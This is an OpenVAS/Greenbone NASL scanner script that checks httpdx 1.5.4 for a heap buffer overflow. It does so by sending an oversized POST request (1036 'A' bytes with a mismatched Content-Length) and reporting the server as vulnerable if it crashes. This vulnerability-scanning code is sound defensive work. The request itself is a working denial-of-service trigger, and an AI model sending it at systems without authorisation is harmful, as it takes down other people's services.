# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:jasper:httpdx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802663");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-07-30 12:12:12 +0530 (Mon, 30 Jul 2012)");
  script_name("httpdx <= 1.5.4 'POST' Request Heap Based Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20120");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_httpdx_server_detect.nasl");
  script_mandatory_keys("httpdx/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code in the context of the application. Failed attacks will cause denial of service
  (DoS) conditions.");

  script_tag(name:"affected", value:"httpdx version 1.5.4 and probably prior.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing http POST
  requests and can be exploited to cause a heap based buffer overflow via a specially crafted
  packet.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"httpdx is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

if(http_is_dead(port:port))
  exit(0);

crash = crap(data:"A", length:1036);
url = "/test.pl";
req = string("POST ", url, " HTTP/1.0\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: 1023\r\n",
             "Content-Type: text\r\n",
             "\r\n", crash);
res = http_send_recv(port:port, data:req);

if(http_is_dead(port:port)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
